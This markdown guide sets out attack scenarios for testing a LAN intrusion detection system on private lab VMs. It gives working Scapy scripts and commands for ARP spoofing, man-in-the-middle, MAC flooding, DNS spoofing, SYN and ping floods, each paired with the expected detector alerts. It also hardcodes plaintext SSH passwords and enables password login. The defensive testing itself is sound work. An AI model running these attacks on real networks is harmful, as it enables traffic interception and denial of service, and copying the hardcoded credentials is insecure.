# SecureNet Attack Execution Guide
## Updated for Current VM Configuration

**Network Configuration:**
- Monitor VM: `192.168.128.8` (username: `monitor`, password: `achu2006`)
- Victim VM: `192.168.128.6` (username: `achu2`, password: `achu2006`)
- Attacker VM: `192.168.128.101` (username: `achu`, password: `achu2006`)
- Gateway: `192.168.128.1`

---

## 🚀 **Quick Start - 3 Terminal Setup**

### **Terminal 1: Monitor VM (Security Logs)**
```bash
sshpass -p achu2006 ssh monitor@192.168.128.8
cd ~/securenet
tail -f lan_security.log | grep -E "ARP|Spoof|Alert|Detect|Attack"
```

### **Terminal 2: Monitor VM (System Status)**
```bash
sshpass -p achu2006 ssh monitor@192.168.128.8
cd ~/securenet
watch -n 2 'tail -10 lan_security.log'
```

### **Terminal 3: Attacker VM (Run Attacks)**
```bash
sshpass -p achu2006 ssh achu@192.168.128.101
```

---

## 💥 **Attack Scenarios**

### **1. ARP Spoofing Attack**

#### **Simple ARP Spoof (Claim to be Gateway)**
```bash
# On Attacker VM (Terminal 3)
sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.1
```
**What it does:** Makes Monitor VM think Attacker is the gateway

#### **ARP Spoof using Scapy (More Control)**
```bash
# On Attacker VM
sudo python3 << 'EOF'
from scapy.all import ARP, Ether, sendp

iface = "eth0"
victim_ip = "192.168.128.6"
gateway_ip = "192.168.128.1"
monitor_ip = "192.168.128.8"

# Broadcast forged ARP replies claiming attacker is the gateway
pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=gateway_ip, pdst=victim_ip)
pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=gateway_ip, pdst=monitor_ip)

pkts = []
for _ in range(500):
    pkts.append(pkt1)
    pkts.append(pkt2)

sendp(pkts, iface=iface, verbose=False)
print("✓ ARP spoof flood sent (500 packets)")
EOF
```

#### **Man-in-the-Middle (Bidirectional)**
```bash
# On Attacker VM
# Terminal 3a:
sudo arpspoof -i eth0 -t 192.168.128.6 192.168.128.8 &

# Terminal 3b (or same):
sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.6
```

**Expected Monitor Output:**
```
🚨 SECURITY ALERT
Attack Type: ARP_SPOOFING
Confidence: 92%
Source IP: 192.168.128.101
Source MAC: <attacker_mac>
Target IP: 192.168.128.6
Timestamp: 2026-01-19 18:10:45

✅ Mitigation Response:
- Flushing ARP tables
- Blocking malicious ARP entries
- Restoring network connectivity
Response Time: 45ms
```

---

### **2. MAC Flooding Attack**

#### **Using hping3**
```bash
# On Attacker VM
sudo hping3 -i u100 \
    --fast \
    -q \
    -L 0 \
    -X \
    -a 192.168.128.101 \
    -d 64 \
    192.168.128.6
```

#### **Using Scapy (Random MAC Addresses)**
```bash
# On Attacker VM
sudo python3 << 'EOF'
from scapy.all import Ether, IP, sendp
import random

interface = "eth0"
target_ip = "192.168.128.6"

print("Starting MAC flood attack...")

for i in range(1000):  # Send 1000 packets with random MACs
    random_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )
    
    packet = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / \
             IP(src="192.168.128.101", dst=target_ip)
    sendp(packet, iface=interface, verbose=False)
    
    if i % 100 == 0:
        print(f"  Sent {i} packets...")

print("✓ MAC flood complete (1000 packets)!")
EOF
```

**Expected Monitor Output:**
```
🚨 SECURITY ALERT
Attack Type: MAC_FLOODING
Confidence: 95%
CAM Table Utilization: 98% (Threshold: 85%)
Affected Hosts: 192.168.128.6
Detection Method: ANOMALY_BASED

✅ Mitigation Response:
- Isolating source port
- Clearing CAM table entries
Response Time: 78ms
```

---

### **3. DNS Spoofing Attack**

```bash
# On Attacker VM
sudo python3 << 'EOF'
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
import random

# Setup
victim_ip = "192.168.128.6"
attacker_ip = "192.168.128.101"
fake_ip = "192.168.128.101"  # Point to attacker

print("Sending DNS spoofing packets...")

# Create DNS response packet
for i in range(50):
    packet = IP(src=attacker_ip, dst=victim_ip) / \
             UDP(sport=53, dport=random.randint(10000, 60000)) / \
             DNS(id=random.randint(0, 65535), qr=1, rd=1, ra=1,
                 qd=DNSQR(qname="google.com"),
                 an=DNSRR(rrname="google.com", ttl=10, rdata=fake_ip))
    
    send(packet, verbose=False)

print("✓ DNS spoofing attack sent (50 packets)!")
EOF
```

**Expected Monitor Output:**
```
🚨 SECURITY ALERT
Attack Type: DNS_SPOOFING
Confidence: 88%
Source IP: 192.168.128.101
Query: google.com
Suspicious Response: 192.168.128.101
TTL Anomaly: Detected (TTL: 10, Expected: 300+)

✅ Mitigation Response:
- Flushing DNS cache
- Blocking malicious DNS server
Response Time: 52ms
```

---

### **4. ARP Request Flood**

```bash
# On Attacker VM
sudo arping -i eth0 -c 1000 192.168.128.8
```
**What it does:** Sends 1000 ARP requests to Monitor VM

---

### **5. Port Scan Detection**

```bash
# On Attacker VM
nmap -sS 192.168.128.6
```
**What it does:** TCP SYN scan of Victim VM

---

### **6. Ping Flood (DoS)**

```bash
# On Attacker VM
sudo ping -f 192.168.128.6
# Press Ctrl+C to stop after a few seconds
```
**What it does:** Sends ICMP flood to Victim VM

---

### **7. SYN Flood**

```bash
# On Attacker VM
sudo hping3 -S --flood -p 80 192.168.128.6
# Press Ctrl+C to stop after a few seconds
```
**What it does:** TCP SYN flood on port 80

---

## 📊 **Monitoring & Verification**

### **Check Detection Logs**
```bash
# On Monitor VM
sshpass -p achu2006 ssh monitor@192.168.128.8 "
  cd ~/securenet
  echo '=== Last 10 Security Events ==='
  tail -20 lan_security.log | grep -E 'ARP|Attack|Alert|Detect'
"
```

### **Count Detected Attacks**
```bash
# On Monitor VM
sshpass -p achu2006 ssh monitor@192.168.128.8 "
  cd ~/securenet
  echo 'ARP Detections:' \$(grep -c 'ARP' lan_security.log)
  echo 'Total Alerts:' \$(grep -c 'ALERT\\|Alert' lan_security.log)
"
```

### **View Real-time Detection Stats**
```bash
# On Monitor VM
sshpass -p achu2006 ssh monitor@192.168.128.8 "
  cd ~/securenet
  watch -n 1 'tail -5 lan_security.log'
"
```

---

## 🔧 **Troubleshooting**

### **Attack Not Detected?**

1. **Check Monitor is Running:**
```bash
sshpass -p achu2006 ssh monitor@192.168.128.8 "ps aux | grep python | grep main"
```

2. **Check Network Interface:**
```bash
sshpass -p achu2006 ssh monitor@192.168.128.8 "ip addr show enp0s1"
```

3. **Verify VMs Can Communicate:**
```bash
ping -c 3 192.168.128.6
ping -c 3 192.168.128.8
ping -c 3 192.168.128.101
```

4. **Check Attacker VM Has Tools:**
```bash
sshpass -p achu2006 ssh achu@192.168.128.101 "which arpspoof hping3 nmap scapy"
```

### **Enable Attacker VM SSH (if needed):**
```bash
# Run on Attacker VM console:
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh
```

---

## ✅ **Quick Test Sequence**

Run this complete test in order:

```bash
# 1. Start monitoring (Terminal 1)
sshpass -p achu2006 ssh monitor@192.168.128.8 'cd ~/securenet && tail -f lan_security.log | grep -i arp'

# 2. Run ARP attack (Terminal 2)
sshpass -p achu2006 ssh achu@192.168.128.101 'timeout 10 sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.1'

# 3. Check results (Terminal 3)
sshpass -p achu2006 ssh monitor@192.168.128.8 'tail -20 ~/securenet/lan_security.log | grep -i arp'
```

---

## 📝 **One-Line Attack Commands**

```bash
# ARP Spoof (10 seconds)
sshpass -p achu2006 ssh achu@192.168.128.101 'timeout 10 sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.6'

# ARP Flood
sshpass -p achu2006 ssh achu@192.168.128.101 'sudo arping -i eth0 -c 500 192.168.128.8'

# Port Scan
sshpass -p achu2006 ssh achu@192.168.128.101 'nmap -sS 192.168.128.6'

# Ping Flood (3 seconds)
sshpass -p achu2006 ssh achu@192.168.128.101 'timeout 3 sudo ping -f 192.168.128.6'

# Check detections
sshpass -p achu2006 ssh monitor@192.168.128.8 'tail -30 ~/securenet/lan_security.log | grep -E "ARP|Attack|Alert"'
```
